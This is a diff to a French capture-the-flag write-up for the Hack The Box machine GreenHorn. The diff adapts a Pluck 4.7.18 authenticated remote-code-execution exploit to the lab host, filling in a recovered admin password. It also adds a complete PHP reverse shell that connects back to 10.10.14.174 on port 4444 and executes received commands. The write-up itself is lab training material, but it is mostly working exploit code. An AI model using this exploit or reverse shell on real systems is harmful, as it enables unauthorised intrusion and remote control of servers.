@@ -106,6 +106,7 @@ http://greenhorn.htb/admin.php?action=start
 ```
 
 Une fois l'accès à l'admin panel confirmé, on utilise le mot de passe avec le RCE suivant:
+upload-reverse-shell.py
 ```python
 #Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
 #Application: pluck
@@ -122,16 +123,16 @@ Une fois l'accès à l'admin panel confirmé, on utilise le mot de passe avec le
 import requests
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 
-login_url = "http://localhost/pluck/login.php"
-upload_url = "http://localhost/pluck/admin.php?action=installmodule"
+login_url = "http://greenhorn.htb/login.php"
+upload_url = "http://greenhorn.htb/admin.php?action=installmodule"
 headers = {"Referer": login_url,}
-login_payload = {"cont1": "admin","bogus": "","submit": "Log in"}
+login_payload = {"cont1": "iloveyou1","bogus": "","submit": "Log in"}
 
-file_path = input("ZIP file path: ")
+file_path = "/home/kali/reverse-shell.zip"
 
 multipart_data = MultipartEncoder(
     fields={
-        "sendfile": ("mirabbas.zip", open(file_path, "rb"), "application/zip"),
+        "sendfile": ("reverse-shell.zip", open(file_path, "rb"), "application/zip"),
         "submit": "Upload"
     }
 )
@@ -159,9 +160,31 @@ else:
     print("Login problem. response code:", login_response.status_code)
 
 
-rce_url="http://localhost/pluck/data/modules/mirabbas/miri.php"
+rce_url="http://localhost/pluck/data/modules/reverse-shell/reverse-shell.php"
 
 rce=requests.get(rce_url)
 
 print(rce.text)
+```
+
+Il ne reste plus qu'à créer le reverse-shell.zip avec le reverse-shell.php à l'intérieur pour être exécuté par le RCE:
+```php
+<?php
+$ip = '10.10.14.174'; // change this to your IP address
+$port = 4444; // change this to your listening port
+$socket = fsockopen($ip, $port);
+if ($socket) {
+    $shell = 'uname -a; w; id; /bin/sh -i';
+    fwrite($socket, $shell);
+    while (!feof($socket)) {
+        $command = fgets($socket);
+        $output = '';
+        if ($command) {
+            $output = shell_exec($command);
+            fwrite($socket, $output);
+        }
+    }
+    fclose($socket);
+}
+?>
 ```
